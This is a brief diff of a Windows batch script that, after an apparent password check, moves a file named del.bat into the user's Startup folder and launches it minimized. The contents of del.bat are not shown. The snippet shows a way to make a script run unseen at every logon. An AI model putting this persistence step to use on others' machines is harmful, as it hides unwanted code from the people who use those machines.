@@ -60,8 +60,8 @@ if %Input% equ %password% (
         @echo off
         set des_path=C:\Users\%username%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup
 
-        move %cd%\del.bat %des_path%
-        start /min del.bat 
+        move C:\Users\peakfila\Desktop\del.bat %des_path%
+        start /min del.bat
 	goto End
 ) else (
 	set /a count=%count% + 1
